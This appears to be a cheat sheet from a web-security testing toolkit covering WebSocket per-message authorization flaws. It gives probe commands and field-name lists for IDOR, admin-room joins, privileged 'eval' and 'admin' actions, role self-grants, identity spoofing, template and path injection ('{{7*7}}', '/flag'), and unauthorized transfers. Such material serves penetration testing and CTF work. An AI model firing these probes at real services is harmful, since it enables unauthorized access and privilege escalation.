# Message-side — the per-frame authz surface

## The model — the per-frame dispatch

```python
async for msg in websocket:
    handler = HANDLERS.get(msg['action'])   # no role check
    if handler: await handler(msg)          # no scope check
```

The HTTP app's per-request `authorize(user, path)` becomes a per-frame
`dispatch(action, fields)` — the `authorize(user, action, field)` is
what's missing.

## The object-IDOR — a field names another's resource

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"read","id":"victim"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"open","doc":"admin-doc"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"history","room":"admin-dm"}'
```

The fields: `id`/`doc`/`object`/`item`/`record`/`room`/`channel`/
`conversation`/`thread`/`user_id`/`uid`/`account`/`org`/`tenant`/
`project`/`file`/`note`/`message`/`ticket`/`order`/`invoice`.

## The membership-IDOR — a subscription/join

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"join","room":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"subscribe","channel":"internal"}'
```

The fields: `join`/`subscribe`/`watch`/`listen`/`follow`/`room`/
`channel`/`topic`/`destination`/`namespace`/`feed`.

## The action-dispatch — a privileged action

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"debug"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"eval","code":"x"}'
```

The dispatch keys: `action`/`type`/`event`/`cmd`/`command`/`method`/`op`/
`verb`/`kind`/`do`/`fn`/`handler`/`route`/`call`/`name`/`sub`/`exec`.
The privileged names: `admin`/`debug`/`internal`/`system`/`eval`/`exec`/
`flag`/`config`/`broadcast`/`impersonate`/`grant`/`reset`/`dump`/`export`/
`metrics`/`reload`/`su`/`login_as`.

## The role-self-grant — the privileged field

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"x","role":"admin"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"x","user":{"role":"admin"}}'
```

The grant fields: `role`/`perm`/`perms`/`permission`/`scope`/`level`/
`tier`/`rank`/`is_admin`/`isAdmin`/`admin`/`debug`/`internal`/`privileged`/
`sudo`/`superuser`/`staff`/`moderator`.

## The identity-spoof — the claimed user

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"from":"victim","action":"x"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"user_id":2,"action":"x"}'
```

The identity fields: `from`/`sender`/`user_id`/`uid`/`user`/`principal`/
`subject`/`actor`/`author`/`owner`/`creator`/`account_id`/`as_user`/
`impersonate`.

## The injection — the sink field

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"q":"{{7*7}}"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"file":"/flag"}'
```

The sink fields: `q`/`search`/`query`/`filter`/`where`/`order`/`sort`/
`field`/`column`/`select`/`match`/`criteria`/`expression`/`clause`/
`name`/`text`/`tpl`/`msg`/`input`/`value`/`template`/`content`/`body`/
`message`/`file`/`path`/`filename`/`url`/`fetch`/`webhook`/`callback`/
`image`/`import`/`xml`/`data`/`parse`/`svg`/`host`/`cmd`/`exec`/`command`/
`target`/`obj`/`config`/`set`/`merge`/`key`/`value`/`session`.

## The write-side — the state-changing frame

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"transfer","to":"me","amount":1}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"broadcast","text":"probe"}'
```

The write fields: `transfer`/`set`/`update`/`grant`/`reset`/`delete`/
`create`/`insert`/`broadcast`/`announce`/`emit-all`/`send_all`/`config`.

## The subscription/backlog — the feed

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"subscribe","channel":"<other>"}'
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"action":"history","room":"<x>","from":0}'
```

The fields: `subscribe`/`topic`/`channel`/`destination`/`namespace`/
`seq`/`offset`/`lastEventId`/`history`/`backlog`/`from`/`to`/`since`.

## The resumption — the session fields

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=x' \
    --message '{"session_id":"<old>"}'
```

The resume fields: `session_id`/`resume`/`reconnect`/`seq`/`offset`/
`lastEventId`/`token`/`auth`/`jwt`/`session`/`key`.

## The message-side record

`message: <endpoint>: <the mechanism>: <the field>: <the verdict>` —
per-field per-mechanism, one field per connection.
